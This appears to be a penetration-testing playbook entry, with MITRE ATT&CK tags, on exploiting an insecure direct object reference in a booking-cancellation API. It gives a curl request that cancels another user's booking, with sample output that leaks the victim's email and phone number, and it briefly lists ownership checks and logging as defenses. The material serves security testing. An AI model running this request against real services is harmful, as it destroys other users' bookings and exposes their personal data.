---
tags:
  - idor
  - web
  - api
  - data-leak
type: procedure
tools: []
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-cancel-table-booking]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Account Discovery]]'
updated_at: '2025-12-14T17:25:33.867Z'
sub_techniques: []
id: 8efa4198-b0ae-47c1-82f7-951eb6a89c74
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Account Discovery]]'
---
# Submit-Modified-Cancellation-Request

## Summary

This procedure submits the tampered booking cancellation request to exploit the IDOR, resulting in unauthorized cancellation and leakage of sensitive user data via the API response.

## Description

Using the modified request, send it to the Eternal API endpoint. Due to missing authorization, the server processes the request, cancels the booking, and returns PII in the response. This targets web applications with direct object references and predictable IDs, impacting user privacy and service availability.

## Requirements

1. Modified request with target booking ID
2. Valid authentication token
3. Tool like curl for sending HTTP requests

## Defense

Defensive measures and detection strategies:

- Log and alert on cross-user object access attempts
- Validate user ownership before any destructive actions like cancellation

## Objectives

1. Successfully cancel a non-owned booking
2. Extract leaked PII from the response
3. Confirm IDOR impact on data exposure

## Instructions

### Step 1: Prepare Authentication

**Context**: Ensure the request includes valid session credentials.

Obtain your Bearer token from a logged-in session.

### Step 2: Execute the Request

**Context**: Send the modified cancellation to trigger the exploit.

Execute [[commands/curl-cancel-table-booking]] with the target ID:

```bash
curl -X POST https://eternal.example.com/api/v1/bookings/cancel \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"booking_id": "TARGET_BOOKING_ID"}'
```

> This command sends the POST request; expect a 200 OK response with cancellation confirmation and user details if vulnerable.

**Expected Output**: {"success": true, "user": {"email": "victim@example.com", "mobile": "1234567890", "uuid": "abc-123"}}

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]]

### Techniques

- [[Account Discovery]]

### Sub-Techniques


## Commands Used

- [[commands/curl-cancel-table-booking]]

## Tools Used


## Tags

- [[idor]]
- [[web]]
- [[api]]
- [[data-leak]]
